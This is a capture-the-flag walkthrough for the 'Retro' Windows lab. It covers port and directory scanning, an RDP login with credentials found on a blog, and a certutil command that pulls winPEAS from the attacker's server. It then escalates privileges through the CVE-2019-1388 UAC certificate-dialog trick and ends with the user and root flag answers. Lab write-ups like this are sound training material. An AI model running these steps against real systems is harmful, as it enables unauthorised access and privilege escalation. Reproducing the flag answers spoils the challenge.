# Retro - Hard

```shell
nmap -T4 -p- -A -Pn -v 10.10.163.31

feroxbuster -u http://10.10.163.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

xfreerdp /u:wade /p:parzival /v:10.10.163.31:3389

#in windows command prompt
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

#in attacker machine
python3 -m http.server

#in windows cmd
cd C:\Users\Wade\Desktop

certutil.exe -urlcache -f http://10.14.31.212:8000/winPEASx64.exe winpeas.exe

#restore hhupd.exe from Recycle Bin
#follow CVE-2019-1388 to get cmd as Administrator
#it will take multiple tries
```

* Open ports & services:

  * 80 - http - Microsoft iis httpd 10.0
  * 3389 - ms-wbt-server - Microsoft Terminal Services

* We can start by enumerating the webpage on port 80; it seems to be a IIS default homepage.

* Using feroxbuster, we get a directory /retro, which leads to a page for 'Retro Fanatics', a blog page.

* Now, exploring the webpage, we can see that the author's name is 'Wade'.

* Furthermore, one of the blogs - 'Ready Player One' - mentions that the main character of the movie with the same name is used while logging in.

* There is a comment left by the author on the same blog, and it mentions 'parzival'.

* We have a possible set of creds, wade:parzival, and that can be used for logging in over the service at port 3389.

* Logging in via xfreerdp, we get the user flag from wade's Desktop.

* We can begin with basic enumeration on the Windows machine by using command prompt.

* ```winpeas``` shows that the system is vulnerable to multiple CVEs - CVE-2019-0836, CVE-2019-1388, CVE-2020-1013.

* We will be using CVE-2019-1388, which abuses the UAC windows certificate dialog.

* We can go through the details by Googling this exploit; we can either download hhupd.exe or restore hhupd.exe from the Recycle Bin.

* In order for this to work, before attempting to carry out the exploit, we have to open IE browser, and it might take multiple tries.

* After multiple times of opening hhupd.exe UAC prompt and going through the steps, we get the option to view the certificate in IE browser.

* This gives us an error page; we can use Ctrl+S to load the 'save page' prompt on IE.

* In the file explorer popup, we can go to C:\Windows\System32\cmd.exe - this loads command prompt as Administrator, and we can view root flag.

```markdown
1. A web server is running on the target. What is the hidden directory which the website lives on? - /retro

2. user.txt - 3b99fbdc6d430bfb51c72c651a261927

3. root.txt - 7958b569565d7bd88d10c6f22d1c4063
```
